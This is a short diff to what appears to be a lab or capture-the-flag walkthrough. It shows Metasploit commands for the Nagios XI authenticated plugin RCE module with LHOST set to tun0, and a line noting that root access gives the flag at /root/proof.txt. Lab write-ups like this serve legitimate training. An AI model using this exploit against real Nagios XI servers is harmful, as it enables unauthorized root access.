@@ -64,6 +64,6 @@ msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set 
 msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set LHOST tun0
 ```
 
-Run and get root:
+Run and get root and flag by way <mark style="color:yellow;">`/root/proof.txt`</mark>:
 
 <figure><img src="../.gitbook/assets/image (5) (3).png" alt=""><figcaption></figcaption></figure>
